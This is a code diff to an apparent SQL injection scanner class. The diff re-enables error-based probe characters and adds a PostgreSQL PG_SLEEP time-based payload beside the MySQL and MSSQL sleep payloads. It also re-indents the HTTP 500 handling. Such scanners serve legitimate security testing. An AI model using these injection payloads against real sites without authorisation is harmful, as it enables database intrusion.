@@ -18,8 +18,8 @@ class SqliManager:
         self._domain = domain
         self._false_positives = ['malformed request syntax',
                                  'eval|internal|range|reference|syntax|type']
-        # self._error_based_payloads = ['\'', '\\', '"', '%27', '%5C', '%2F']
-        self._error_based_payloads = []
+        self._error_based_payloads = ['\'', '\\', '"', '%27', '%5C', '%2F']
+        # self._error_based_payloads = []
         self._time_based_payloads = [
             {'TruePld': '\'OR(if(1=1,sleep(5),0))OR\'', 'FalsePld': '\'OR(if(1=2,sleep(5),0))OR\'',
              'True2Pld': '\'OR(if(2=2,sleep(5),0))OR\''},
@@ -27,6 +27,8 @@ class SqliManager:
              'True2Pld': '"OR(if(2=2,sleep(5),0))OR"'},
             {'TruePld': '1; WAIT FOR DELAY \'00:00:05', 'FalsePld': '1; WAIT FOR DELAY \'00:00:01',
              'True2Pld': '1; WAIT FOR DELAY \'00:00:08'},
+            {'TruePld': '\' OR \'1\'>(SELECT \'1\' FROM PG_SLEEP(5)) OR \'', 'FalsePld': '\' OR \'1\'>(SELECT \'1\' FROM PG_SLEEP(0)) OR \'',
+             'True2Pld': '\' OR \'1\'>(SELECT \'1\' FROM PG_SLEEP(6)) OR \''},
         ]
         self._delay_in_seconds = 5
         self._request_handler = RequestHandler(cookies, headers)
@@ -260,11 +262,11 @@ class SqliManager:
 
                 need_to_discard_payload = True
 
-            if response.status_code == 500:
-                details = response.text[0:200].replace('\n', '').replace('\r', '').strip()
-                print(f"SqliManager: 500 status - {url_payload}; DETAILS: {details}")
-                need_to_discard_payload = True
-                self.errors_500.append({'url': url_payload, 'response': response})
+        if response.status_code == 500:
+            details = response.text[0:200].replace('\n', '').replace('\r', '').strip()
+            print(f"SqliManager: 500 status - {url_payload}; DETAILS: {details}")
+            need_to_discard_payload = True
+            self.errors_500.append({'url': url_payload, 'response': response})
 
         return need_to_discard_payload
 
